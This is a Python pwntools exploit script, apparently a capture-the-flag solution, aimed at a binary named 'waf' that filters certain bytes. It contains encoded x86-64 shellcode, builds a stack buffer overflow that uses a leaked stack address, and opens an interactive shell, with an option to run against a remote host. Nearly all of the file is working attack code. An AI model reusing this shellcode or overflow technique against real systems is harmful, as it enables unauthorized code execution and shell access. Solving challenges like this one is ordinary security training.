from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "waf").resolve().__str__()
BUF_SIZE = 0x110 + 8  # 272 + 8
# BUF_SIZE = 264

FD = 1000
# buf_len = len(buf)
# \x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6F\x6E\x70\x71\x75\x72\x74\x73\x41\x42\x43\x44\x2F\x62\x69\x6E\x73\x68\x68
# 61,62,63,64,65,66,67,68,69,6A,6B,6C,6D,6F,6E,70,71,75,72,74,73,41,42,43,44,2F,62,69,6E,73,68,68
badChar = "abcdefghijklmonpqurtsABCD/binshh".encode("ascii")
badChar = badChar.hex()

buf = b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xcb\x84\x85\x90\xe1"
buf += b"\xd6\xd3\xc2\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x83\x3c\xaa\xf2\x88\xb8\xfc\xb1\xa3"
buf += b"\x84\x1c\xc0\xb5\x89\x81\xa4\xa3\xa9\xe6\xc4\xbf"
buf += b"\x84\x3b\xca\xcb\x84\x85\xbf\x83\xbf\xbd\xed\xb8"
buf += b"\xec\x85\xc6\xb6\x82\x8d\xa8\xf0\xdc\x8a\x95\xe1"
buf += b"\xd6\xd3\xc2"

buf_len = len(buf)
NOP = b"\x90"
PADDING = NOP * (16 - buf_len % 16)


# b *vuln
gdb_script = """
b *firewall_check
b *firewall_check+64
b *firewall_check+110
b *firewall_check+147
b *vuln+181
c
"""
print("____________________________________")
print(f"Len of buffer: {buf_len}")
print(f"Disasm: {disasm(buf)}")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims=": ")
print("____________________________________")
print(res)


# Get the stack address
print("____________________________________")
stack_addr = io.recvline().decode("ascii").strip()
print(f"Our buffer address received: {stack_addr}")
stack_addr_int = int(stack_addr, 16)

payload = (
    PADDING + buf + (BUF_SIZE - len(PADDING) - buf_len) * NOP + p64(stack_addr_int)
)


# print("____________________________________")
# Get the stack address
# res = io.recvlines(2)
# print(res)
print(f"Sending payload")
io.sendline(payload)

print("____________________________________")
# res = io.recvline()
# print(res)

io.interactive()
